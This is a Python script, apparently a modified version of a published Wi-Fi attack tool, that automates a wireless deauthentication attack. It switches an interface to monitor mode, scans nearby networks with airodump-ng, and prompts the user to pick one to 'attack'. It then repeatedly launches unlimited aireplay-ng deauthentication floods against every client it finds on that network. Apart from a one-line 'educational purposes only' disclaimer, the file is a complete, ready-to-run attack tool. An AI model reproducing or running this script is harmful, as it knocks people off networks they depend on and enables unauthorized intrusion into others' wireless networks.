#!/usr/bin/env python3

# Disclaimer: 
# This script is for educational purposes only.  
# Do not use against any network that you don't own or have authorization to test.

import csv
from datetime import datetime
import os
import re
import shutil
import subprocess
import threading
import time
import logging
import platform
import matplotlib.pyplot as plt

# Constants
BAND_OPTIONS = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
CSV_FIELDNAMES = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
CLIENT_CSV_FIELDNAMES = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]

# Regular Expressions
MAC_ADDRESS_REGEX = re.compile(r'(?:[0-9a-fA-F]:?){12}')
WLAN_CODE = re.compile(r"Interface (\S+)", re.MULTILINE)

logging.basicConfig(filename='network_attack.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Helper functions
def check_sudo():
    """Check if the script is running with sudo privileges (Unix-like systems only)."""
    if platform.system() != 'Windows' and 'SUDO_UID' not in os.environ:
        logging.error("Script not run with sudo privileges.")
        print("Please run this program with sudo.")
        exit()

def find_network_interfaces():
    """Find and return network interface controllers on the computer."""
    if platform.system() == 'Windows':
        result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True).stdout
    else:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
    return WLAN_CODE.findall(result)

def set_monitor_mode(interface):
    """Set the specified network interface controller to monitor mode (Unix-like systems only)."""
    if platform.system() == 'Windows':
        logging.info("Monitor mode setting is not supported on Windows.")
    else:
        subprocess.run(["ip", "link", "set", interface, "down"])
        subprocess.run(["airmon-ng", "check", "kill"])
        subprocess.run(["iw", interface, "set", "monitor", "none"])
        subprocess.run(["ip", "link", "set", interface, "up"])
        logging.info(f"Set {interface} to monitor mode.")

def set_band_to_monitor(interface, choice):
    """Start airodump-ng with the specified band to monitor."""
    bands = ["bg", "a", "abg"]
    band = bands[choice] if choice in [0, 1, 2] else "abg"
    if platform.system() == 'Windows':
        logging.info("Airodump-ng is not supported on Windows.")
    else:
        subprocess.Popen(
            ["airodump-ng", "--band", band, "-w", "output/file", "--write-interval", "1", "--output-format", "csv", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        logging.info(f"Started monitoring on {interface} with band {band}.")

def backup_csv_files():
    """Move all .csv files in the current directory to a backup folder."""
    for file_name in os.listdir():
        if file_name.endswith(".csv"):
            print("Found .csv files in your directory. Moving to backup folder.")
            directory = os.getcwd()
            backup_dir = os.path.join(directory, "backup")
            os.makedirs(backup_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            shutil.move(file_name, os.path.join(backup_dir, f"{timestamp}-{file_name}"))
            logging.info(f"Moved {file_name} to backup folder.")

def check_for_essid(essid, networks):
    """Check if the ESSID is already in the list of networks."""
    return not any(network["ESSID"] == essid for network in networks)

def visualize_networks(networks):
    """Visualize the detected Wi-Fi networks."""
    essids = [network["ESSID"] for network in networks]
    powers = [int(network["Power"]) for network in networks]

    plt.figure(figsize=(10, 5))
    plt.barh(essids, powers, color='blue')
    plt.xlabel('Signal Strength (dBm)')
    plt.ylabel('ESSID')
    plt.title('Detected Wi-Fi Networks')
    plt.show()

def display_wifi_networks():
    """Display the Wi-Fi networks and allow the user to select one."""
    networks = []
    try:
        while True:
            subprocess.call("cls" if platform.system() == "Windows" else "clear", shell=True)
            for file_name in os.listdir():
                if file_name.endswith(".csv"):
                    with open(file_name) as csv_file:
                        csv_reader = csv.DictReader(csv_file, fieldnames=CSV_FIELDNAMES)
                        for row in csv_reader:
                            if row["BSSID"] in ["BSSID", "Station MAC"]:
                                continue
                            if check_for_essid(row["ESSID"], networks):
                                networks.append(row)

            print("Scanning. Press Ctrl+C to select a network.\n")
            print("No | BSSID              | Channel | ESSID")
            print("---|-------------------|---------|-----------------------------")
            for index, network in enumerate(networks):
                print(f"{index:2} | {network['BSSID']} | {network['channel'].strip():7} | {network['ESSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    visualize_networks(networks)

    while True:
        try:
            choice = int(input("Select a network to attack (number): "))
            if 0 <= choice < len(networks):
                return networks[choice]
        except (ValueError, IndexError):
            pass
        print("Invalid choice. Please try again.")

def set_managed_mode(interface):
    """Set the network interface controller back to managed mode and restart network services (Unix-like systems only)."""
    if platform.system() == 'Windows':
        logging.info("Managed mode setting is not supported on Windows.")
    else:
        subprocess.run(["ip", "link", "set", interface, "down"])
        subprocess.run(["iwconfig", interface, "mode", "managed"])
        subprocess.run(["ip", "link", "set", interface, "up"])
        subprocess.run(["service", "NetworkManager", "start"])
        logging.info(f"Set {interface} back to managed mode.")

def capture_clients(bssid, channel, interface):
    """Capture client devices connected to the selected network."""
    if platform.system() == 'Windows':
        logging.info("Capturing clients is not supported on Windows.")
    else:
        subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", "output/clients", "--write-interval", "1", "--output-format", "csv", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        logging.info(f"Started capturing clients on {bssid} channel {channel} with interface {interface}.")

def perform_deauth_attack(target_bssid, client_mac, interface):
    """Perform a deauthentication attack on the specified client."""
    if platform.system() == 'Windows':
        logging.info("Deauthentication attack is not supported on Windows.")
    else:
        subprocess.Popen(
            ["aireplay-ng", "--deauth", "0", "-a", target_bssid, "-c", client_mac, interface]
        )
        logging.info(f"Started deauth attack on {client_mac} on {target_bssid} using {interface}.")

def generate_report(networks, active_clients):
    """Generate a report of the networks and clients."""
    report_file = f"report_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    with open(report_file, 'w') as f:
        f.write("Wi-Fi Networks:\n")
        for network in networks:
            f.write(f"ESSID: {network['ESSID']}, BSSID: {network['BSSID']}, Channel: {network['channel']}, Signal: {network['Power']}\n")
        
        f.write("\nActive Clients:\n")
        for client in active_clients:
            f.write(f"Client MAC: {client}\n")
    logging.info(f"Report generated: {report_file}")

def main():
    print(r"""
______   __ ______    _   _____ _   ___    _   ___
                            __          __      __      
 __  __              __    /\ \  __    /\ \  __/\ \__   
/\_\/\_\    ___ ___ /\_\   \_\ \/\_\   \_\ \/\_\ \ ,_\  
\/\ \/\ \ /' __` __`\/\ \  /'_` \/\ \  /'_` \/\ \ \ \/  
 \ \ \ \ \/\ \/\ \/\ \ \ \/\ \L\ \ \ \/\ \L\ \ \ \ \ \_ 
 _\ \ \ \_\ \_\ \_\ \_\ \_\ \___,_\ \_\ \___,_\ \_\ \__\
/\ \_\ \/_/\/_/\/_/\/_/\/_/\/__,_ /\/_/\/__,_ /\/_/\/__/
\ \____/                                                
 \/___/                                                 
 ________________ __     _  ____   _      ____   _   __ _
    """)
    print("\n****************************************************************")
    print("\n* Copyright of jimididit, 2024                                 *")
    print("\n* https://www.jimididit.com                                    *")
    print("\n* https://www.youtube.com/@jimididit                           *")
    print("\n* Modified by Dystortion                                      *")
    print("\n****************************************************************")

    check_sudo()
    backup_csv_files()

    macs_not_to_deauth = []
    while True:
        macs = input("Enter MAC Addresses to exclude from deauth (comma-separated): ")
        macs_not_to_deauth = MAC_ADDRESS_REGEX.findall(macs)
        if macs_not_to_deauth:
            macs_not_to_deauth = [mac.upper() for mac in macs_not_to_deauth]
            break
        print("No valid MAC addresses entered. Please try again.")

    while True:
        print("Select the Wi-Fi band to scan:")
        for index, option in enumerate(BAND_OPTIONS):
            print(f"{index} - {option}")
        try:
            band_choice = int(input("Choice: "))
            if 0 <= band_choice < len(BAND_OPTIONS):
                break
        except ValueError:
            pass
        print("Invalid choice. Please try again.")

    interfaces = find_network_interfaces()
    if not interfaces:
        print("No network interfaces found. Please connect a network interface and try again.")
        exit()

    while True:
        print("Select the network interface to use:")
        for index, interface in enumerate(interfaces):
            print(f"{index} - {interface}")
        try:
            interface_choice = int(input("Choice: "))
            if 0 <= interface_choice < len(interfaces):
                wifi_interface = interfaces[interface_choice]
                break
        except ValueError:
            pass
        print("Invalid choice. Please try again.")

    set_monitor_mode(wifi_interface)
    set_band_to_monitor(wifi_interface, band_choice)
    selected_network = display_wifi_networks()
    bssid = selected_network["BSSID"]
    channel = selected_network["channel"].strip()

    capture_clients(bssid, channel, wifi_interface)

    active_clients = set()
    threads_started = []

    if platform.system() != 'Windows':
        subprocess.run(["airmon-ng", "start", wifi_interface, channel])

    try:
        while True:
            subprocess.call("cls" if platform.system() == "Windows" else "clear", shell=True)
            for file_name in os.listdir():
                if file_name.startswith("clients") and file_name.endswith(".csv"):
                    with open(file_name) as csv_file:
                        csv_reader = csv.DictReader(csv_file, fieldnames=CLIENT_CSV_FIELDNAMES)
                        for row in csv_reader:
                            if row["Station MAC"] in ["Station MAC", "BSSID"]:
                                continue
                            if row["Station MAC"] not in macs_not_to_deauth:
                                active_clients.add(row["Station MAC"])

            print("Active clients:")
            for client in active_clients:
                print(client)
                if client not in threads_started:
                    threads_started.append(client)
                    threading.Thread(target=perform_deauth_attack, args=(bssid, client, wifi_interface), daemon=True).start()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping deauth attack")
        logging.info("Deauth attack stopped by user.")

    set_managed_mode(wifi_interface)
    generate_report([selected_network], active_clients)

if __name__ == "__main__":
    main()
